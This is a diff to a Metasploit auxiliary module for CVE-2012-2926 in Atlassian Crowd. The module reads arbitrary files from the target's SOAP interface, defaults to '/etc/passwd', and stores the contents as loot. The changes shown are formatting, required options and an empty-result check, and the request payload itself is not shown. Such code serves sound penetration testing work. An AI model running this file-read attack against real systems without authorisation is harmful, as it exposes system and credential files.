@@ -19,8 +19,8 @@ class Metasploit4 < Msf::Auxiliary
 			'References'   =>
 				[
 					[ 'CVE', '2012-2926' ],
-					[ 'OSVDB', '82274'],
-					[ 'BID', '53595'],
+					[ 'OSVDB', '82274' ],
+					[ 'BID', '53595' ],
 					[ 'URL', 'https://www.neg9.org' ], # General
 					[ 'URL', 'https://confluence.atlassian.com/display/CROWD/Crowd+Security+Advisory+2012-05-17']
 				],
@@ -37,8 +37,8 @@ class Metasploit4 < Msf::Auxiliary
 		register_options(
 		[
 			Opt::RPORT(8095),
-			OptString.new('TARGETURI', [false, 'Path to Crowd', '/crowd/services']),
-			OptString.new('RFILE', [false, 'Remote File', '/etc/passwd'])
+			OptString.new('TARGETURI', [true, 'Path to Crowd', '/crowd/services']),
+			OptString.new('RFILE', [true, 'Remote File', '/etc/passwd'])
 
 		], self.class)
 
@@ -62,8 +62,6 @@ class Metasploit4 < Msf::Auxiliary
 
 		accessfile(ip)
 	end
-
-
 
 	def accessfile(rhost)
 		print_status("#{rhost}:#{rport} Connecting to Crowd SOAP Interface")
@@ -129,6 +127,10 @@ class Metasploit4 < Msf::Auxiliary
 			case res.body
 			when /<faultstring\>Invalid boolean value: \?(.*)<\/faultstring>/m
 				loot = $1
+				if not loot or loot.empty?
+					print_status("#{rhost}#{rport} Retrieved empty file from #{rhost}:#{rport}")
+					return
+				end
 				f = ::File.basename(datastore['RFILE'])
 				path = store_loot('atlassian.crowd.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
 				print_status("#{rhost}:#{rport} Atlassian Crowd - #{datastore['RFILE']} saved in #{path}")
